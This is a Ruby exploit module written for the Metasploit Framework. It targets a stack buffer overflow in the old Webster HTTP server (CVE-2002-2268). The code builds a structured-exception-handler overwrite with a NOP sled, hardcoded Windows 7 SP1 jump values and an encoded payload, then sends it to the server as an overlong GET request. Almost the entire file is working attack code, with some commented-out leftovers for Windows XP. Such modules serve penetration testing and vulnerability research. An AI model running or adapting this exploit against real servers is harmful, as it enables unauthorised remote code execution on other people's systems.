##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Webster HTTP Server GET Buffer Overflow',
			'Description'    => %q{
					This exploits a stack buffer overflow in the Webster HTTP server.
					The server and source code was released within an article from
					the Microsoft Systems Journal in February 1996 titled "Write a
					Simple HTTP-based Server Using MFC and Windows Sockets".
			},
			'Author'         => [ 'patrick' ],
			'References'     =>
				[
					[ 'CVE', '2002-2268' ],
					[ 'OSVDB', '44106' ],
					[ 'BID', '6289' ],
					[ 'URL', 'http://www.microsoft.com/msj/archive/s25f.aspx' ],
					[ 'URL', 'http://www.netdave.com/webster/webster.htm' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					#'BadChars'    => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 7 SP1', 	{ 
									'Seh' => "\xE3\x74\x24\x6C", 
									'Nseh' => "\xFF\x64\x24\x5C",
									'Offset' => 1234 } ] ,
					[ 'Debug', 		{ 'Ret' => 0x44434241 } ] , # todo - add more targets.
				],
			'DisclosureDate' => 'Dec 02 2002',
			'DefaultTarget'  => 0))
	end

	def exploit
		print_status("Sending request...")
		#seh = generate_seh_payload(target.ret)

		#send_request_raw({
		#	'uri' => "/" + "\x90"*1234 + seh
		#}, 2)

		# XP SP3
		# nseh = 0xFF642424 # jmp [ESP+36] - to our shellcode
		#seh = 0x73d92427 # pop edi - pop esi - ret 0x04 in CRTDLL.dll
		#shelloffset = 82
		#offset = 1206

		# Win7
		offset = 1234
		nseh = "\xFF\x64\x24\x5C"
		seh = "\xE3\x74\x24\x6C"

		#print_status("Offset: #{target["Offset"]}\nNseh: #{target["Nseh"]}\nSeh: #{target["Seh"]}")
		sploit = "\x90"*offset #target["Offset"] #Rex::Text.rand_text_alphanumeric(offset)
		sploit << nseh #target["Nseh"].pack('V')
		sploit << seh #target["Seh"].pack('V')
		sploit << "\x90"*80 #Rex::Text.rand_text_alphanumeric(200)
		sploit << payload.encoded
		sploit << "\x90"*80

		print_status("sploit: #{sploit.length}")
		send_request_raw({
			'uri' => "/" + sploit
		}, 2)

		handler
	end

end
